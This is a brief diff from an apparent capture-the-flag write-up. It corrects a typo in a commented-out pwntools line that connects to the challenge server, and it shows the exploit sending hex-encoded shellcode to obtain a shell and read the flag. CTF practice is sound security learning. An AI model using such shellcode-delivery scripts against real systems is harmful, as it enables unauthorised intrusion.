@@ -135,7 +135,7 @@ Once in the server, just cat the flag. Note that the server's `$PATH` was pollut
 # For local test
 r = process(binary_path)
 # For live challenge
-# r = remote(c'tf-85ib.balancedcompo.site', 9998) 
+# r = remote('ctf-85ib.balancedcompo.site', 9998) 
 
 r.read()
 r.sendline(shellcode.hex())
